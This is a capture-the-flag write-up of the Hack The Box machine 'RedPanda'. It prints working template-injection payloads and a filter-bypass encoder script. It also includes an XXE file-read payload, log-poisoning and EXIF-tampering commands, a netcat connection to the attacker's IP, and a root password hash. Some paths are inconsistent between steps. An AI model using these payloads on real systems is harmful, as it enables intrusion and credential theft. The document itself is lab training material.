> Author: **[Woodenk][author-profile]**

## Discovery

### Services

TCP:

```shell
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Fri, 15 Jul 2022 09:13:44 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Fri, 15 Jul 2022 09:13:44 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 15 Jul 2022 09:13:44 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```

UDP:

```shell
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
16786/udp open|filtered unknown
18228/udp open|filtered unknown
19541/udp open|filtered jcp
20309/udp open|filtered unknown
20518/udp open|filtered unknown
21167/udp open|filtered unknown
21247/udp open|filtered unknown
48489/udp open|filtered unknown
49200/udp open|filtered unknown
58797/udp open|filtered unknown
```

### Web browsing

`8080` lands on a search page:

![][panda-search]

The `stats` endpoint displays the views for each panda image:

![][panda-stats]

It promises `a bigger payout bonus for their content` if the images have lots of views. However the stats are not updated when we search for the pandas or directly hit the image path??

The `export` endpoint sends a XML back with the author reflected in it. However it looks like only `damian` and `woodenk` are accepted.

### Directories

```
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
/error                (Status: 500) [Size: 86] 
/[                    (Status: 400) [Size: 435]
/plain]               (Status: 400) [Size: 435]
/]                    (Status: 400) [Size: 435]
/quote]               (Status: 400) [Size: 435]
/extension]           (Status: 400) [Size: 435]
/[0-9]                (Status: 400) [Size: 435]
```

## User

### Identifying the vulnerability

Manual fuzzing for SSTI / SQLi / XSS failed in the GET parameters.

However, in the POST search `#{7*7}` works:

```
You searched for: ??49_en_US??
```

Spring Boot is made in Java and it uses [Thymeleaf][spring-boot-template-engine] as template engine.

For once [Hacktricks][hacktricks-ssti] was not enough since the dollar sign is banned.

[Acunetix][acunetix] shows the different kinds of payloads in Thymeleaf:

```
${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
*{...}: Selection expressions – similar to variable expressions but used for specific purposes.
#{...}: Message (i18n) expressions – used for internationalization.
@{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
~{...}: Fragment expressions – they let you reuse parts of templates.
```

And indeed replacing the `$` on the payloads from Hacktricks works:

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/x-www-form-urlencoded'\
    --data-binary $'name=(*{T(java.lang.Runtime).getRuntime().exec(\'id\')})' \
    $'http://10.10.11.170:8080/search'
# <h2 class="searched">You searched for: Process[pid=8691, exitValue=&quot;not exited&quot;]</h2>
```

Sidenote: the tool Tplmap fails to detect the SSTI.

```shell
tplmap -u http://10.10.11.170:8080/search -X POST -d 'name=greg' --level 5
```

### Crafting a Java payload

The dollar is banned and the system calls all returned the process id.
Reverse shells through system calls failed too for me, most likely because of a firewall since the website itself is proxied.

In the end I could read file using Java functions:

```java
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())
/*<h2 class="searched">You searched for: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
</h2>*/
```

There is only one user:

```shell
grep -vE 'nologin|false' sources/passwd
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
```

Leaking the SSH key failed:

```python
command = b'cat /home/woodenk/.ssh/id_rsa'
payload_template = 'T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString({}){}).getInputStream())'
encoding_template = '.concat(T(java.lang.Character).toString({}))'
print('*{' + payload_template.format(
    command[0],
    ''.join([encoding_template.format(b) for b in command[1:]])) + '}')
# *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(97))).getInputStream())}
```

However the flag is accessible!

### Getting a shell

Netcat is installed by the `-e` flag is disabled. Also it looks like pipes don't work:

```shell
python payloads/ssti.py 'echo -n aGV5aGV5 | base64 -d'
# <h2 class="searched">You searched for: aGV5aGV5 | base64 -d</h2>
python payloads/ssti.py 'echo -n aGV5aGV5 > img/test'
# <h2 class="searched">You searched for: aGV5aGV5 &gt; img/test</h2>
```

Since even `socat` was absent I felt it would be less efforts to improve my script and make it into a mock webshell.

```shell
python payloads/ssti.py 'id'
# uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
python payloads/ssti.py 'ls -lah'
# total 40K
# drwxr-xr-x  2 woodenk logs 4.0K Jul 15 09:02 .
# drwxrwxrwt 16 root    root 4.0K Jul 15 09:46 ..
# -rw-------  1 woodenk logs  32K Jul 15 12:54 878
```

Good enough for me.

## Root

### Manual enumeration

Before running more serious tools:

```shell
groups
# logs woodenk
env
# SHELL=/bin/bash
# JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64/bin/java
# SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
# SUDO_USER=root
# LOGNAME=woodenk
# MAVEN_CONFIG_HOME=/home/woodenk/.m2
# MAVEN_VERSION=3.8.3
# MAVEN_HOME=/opt/maven
# SHLVL=2
ps auxf
# USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root           1  0.0  0.5 102364 11124 ?        Ss   09:02   0:02 /sbin/init maybe-ubiquity
# root         462  0.0  0.6  35696 13944 ?        S<s  09:02   0:00 /lib/systemd/systemd-journald
# root         491  0.0  0.2  22476  5828 ?        Ss   09:02   0:00 /lib/systemd/systemd-udevd
# root         612  0.0  0.8 214596 17944 ?        SLsl 09:02   0:01 /sbin/multipathd -d -s
# systemd+     634  0.0  0.3  90872  6144 ?        Ssl  09:02   0:01 /lib/systemd/systemd-timesyncd
# root         650  0.0  0.5  47540 10848 ?        Ss   09:02   0:00 /usr/bin/VGAuthService
# root         652  0.1  0.4 237772  8292 ?        Ssl  09:02   0:15 /usr/bin/vmtoolsd
# root         670  0.0  0.2  99896  5896 ?        Ssl  09:02   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
# root         682  0.0  0.4 239292  9068 ?        Ssl  09:02   0:00 /usr/lib/accountsservice/accounts-daemon
# message+     683  0.0  0.2   7384  4604 ?        Ss   09:02   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
# root         700  0.0  0.1  81956  3784 ?        Ssl  09:02   0:00 /usr/sbin/irqbalance --foreground
# root         703  0.0  0.4 236436  9036 ?        Ssl  09:02   0:00 /usr/lib/policykit-1/polkitd --no-debug
# syslog       709  0.0  0.2 224344  4820 ?        Ssl  09:02   0:00 /usr/sbin/rsyslogd -n -iNONE
# root         716  0.0  0.2  17124  5892 ?        Ss   09:02   0:00 /lib/systemd/systemd-logind
# root         721  0.0  0.6 395484 13504 ?        Ssl  09:02   0:00 /usr/lib/udisks2/udisksd
# root         759  0.0  0.6 318816 13540 ?        Ssl  09:02   0:00 /usr/sbin/ModemManager
# systemd+     815  0.0  0.6  24564 13204 ?        Ss   09:02   0:01 /lib/systemd/systemd-resolved
# root         859  0.0  0.1   6812  2964 ?        Ss   09:02   0:00 /usr/sbin/cron -f
# root         862  0.0  0.1   8356  3340 ?        S    09:02   0:00  \_ /usr/sbin/CRON -f
# root         864  0.0  0.0   2608   600 ?        Ss   09:02   0:00      \_ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
# root         865  0.0  0.2   9420  4576 ?        S    09:02   0:00          \_ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
# woodenk      878  2.8 17.2 3176448 349280 ?      Sl   09:02   6:45              \_ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
# woodenk     9717  0.0  0.0   3332  2020 ?        S    11:51   0:00                  \_ nc 10.10.16.4 9999
# woodenk    10636  0.0  0.1   9220  3732 ?        R    12:56   0:00                  \_ ps auxf
# daemon       863  0.0  0.1   3792  2160 ?        Ss   09:02   0:00 /usr/sbin/atd -f
# root         889  0.0  0.3  12172  7296 ?        Ss   09:02   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
# root         900  0.0  0.0   5828  1872 tty1     Ss+  09:02   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
# mysql        914  0.6 21.9 1821452 444868 ?      Ssl  09:02   1:33 /usr/sbin/mysqld
pspy
# 2022/07/15 14:24:01 CMD: UID=0    PID=11866  | /bin/sh /root/run_credits.sh
ls -lah /credits
# -rw-r-----  1 root logs  422 Jul 15 09:58 damian_creds.xml
# -rw-r-----  1 root logs  426 Jul 15 09:58 woodenk_creds.xm
```

The credits are readable but written by root.

Also the source code of the application is relatively small:

```shell
ls -lah /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/
# -rw-rw-r-- 1 root root 4.3K Jun 20 13:02 MainController.java
# -rw-rw-r-- 1 root root  779 Feb 21 18:04 PandaSearchApplication.java
# -rw-rw-r-- 1 root root 1.8K Jun 14 14:09 RequestInterceptor.java
ls -lah /opt/credit-score/LogParser/final/src/main/java/com/logparser/
# -rw-rw-r-- 1 root root 3.7K Jun 20 15:43 App.java
```

### Running LinPeas

The CVE-2021-3560 did not work for me, or at least the [POC from secnigma][cve-3560-poc] failed:

```
[x] ERROR: Accounts service and Gnome-Control-Center NOT found!!
```

### The app workflow

The app logs all the requests in `/opt/panda_search/redpanda.log`:

```java
System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
BufferedWriter bw = new BufferedWriter(fw);
bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
```

The target URL is extracted from the log to identify the image:

```java
String[] strings = line.split("\\|\\|");
map.put("uri", strings[3]);
```

The author is retrieved from the metadata of the image:

```java
Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
for(Directory dir : metadata.getDirectories()) {
    for(Tag tag : dir.getTags()) {
        if(tag.getTagName() == "Artist") {
            return tag.getDescription();
        }
    }
}
```

Which points the app to the corresponding credit file:

```java
String xmlPath = "/credits/" + artist + "_creds.xml";
```

And then increment the view in the author's credit file:

```java
el.getChild("views").setText(Integer.toString(views + 1));
```

Here's the whole process for a log line:

```java
Map parsed_data = parseLog(line);
System.out.println(parsed_data.get("uri"));
String artist = getArtist(parsed_data.get("uri").toString());
System.out.println("Artist: " + artist);
String xmlPath = "/credits/" + artist + "_creds.xml";
addViewTo(xmlPath, parsed_data.get("uri").toString());
```

### Exploiting the credits and scoring!

The last step evaluates a XML without restrictions: it can be used to read files. This payload from [Hacktricks][hacktricks-xxe] can be used as `apehex_creds.xml` credit file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lfi [ <!ENTITY key SYSTEM "file:///root/root.txt" > ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/../../../../../../../home/woodenk/greg.jpg</uri>
    <pwn>&key;</pwn>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

The `../` are meant to undo the path to the static files:

```java
String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
```

Then to trigger the processing of this XML, the target image itself has to store the path to the credits file:

```shell
exiftool -Artists=../home/woodenk/apehex payloads/greg.jpg
```

Finally, let's poison the log file and add our own field to the path. This way, `root.jpg` will have a logged view:

```shell
curl -i -s -k -X $'GET' \
    -H $'User-Agent: greg||/../../../../../../../home/woodenk/greg.jpg' \
    $'http://10.10.11.170:8080/img/greg.jpg'
```

It has worked:

```shell
cat /opt/panda_search/redpanda.log 
# 200||10.10.16.4||greg||../../../../../../../tmp/root.jpg||/img/greg.jpg
```

Ok, you have to be patient for this one! I literally had time to fetch food before the server updated my XML...

> `root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::`

[acunetix]: https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
[author-profile]: https://app.hackthebox.com/users/25507
[cve-3560-poc]: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
[hacktricks-ssti]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java
[hacktricks-xxe]: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file
[panda-stats]: images/panda-stats.png
[panga-search]: images/panga-search.png
[spring-boot-template-engine]: https://www.baeldung.com/spring-template-engines#thymeleaf
